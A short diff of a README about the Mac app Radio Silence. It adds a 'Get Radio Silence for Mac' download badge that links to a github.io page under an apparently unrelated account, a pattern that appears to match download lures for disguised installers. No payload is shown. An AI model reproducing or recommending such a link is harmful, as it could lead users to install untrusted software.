@@ -2,6 +2,10 @@
 
 ![Radio Silence Mac Logo](https://images.icon-icons.com/3053/PNG/512/radio_silence_macos_bigsur_icon_189799.png)   
 
+[![🔒 Get Radio Silence for Mac](https://img.shields.io/badge/🔒_Get_Radio_Silence_for_Mac-black?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/radio-silence)  
+
+
+
 ---
 
 ![Radio Silence Blocking Apps](https://insmac.org/uploads/posts/2021-03/1615216174_radio-silence_02.jpg) 
